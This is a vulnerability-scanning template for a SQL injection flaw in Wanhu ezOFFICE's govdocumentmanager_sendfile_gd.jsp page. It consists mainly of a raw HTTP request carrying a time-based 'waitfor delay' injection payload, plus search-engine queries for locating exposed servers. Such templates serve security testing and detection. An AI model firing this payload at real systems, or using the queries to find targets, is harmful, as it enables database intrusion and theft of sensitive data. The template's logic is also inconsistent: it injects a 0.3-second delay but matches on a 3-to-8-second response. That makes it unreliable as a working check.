id: wanhu-govdocumentmanager-sendfile-gd-sqli

info:
  name: 万户 ezOFFICE govdocumentmanager_sendfile_gd 存在SQL 注入
  author: onewin
  severity: high
  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台govdocumentmanager_sendfile_gd存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息。
  metadata:
    max-request: 1
    Fofa-query: body="/defaultroot/images"
    Quake-query: body="/defaultroot/images"
    Hunter-query: body="/defaultroot/images"
  tags: 万户网络-ezOFFICE

http:
  - raw:
      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=221;waitfor+delay+'0:0:0.3'--+- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
        Connection: close
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3 && duration<8"
      - type: word
        words:
          - "/defaultroot"
        part: body
      - type: status
        status:
          - 200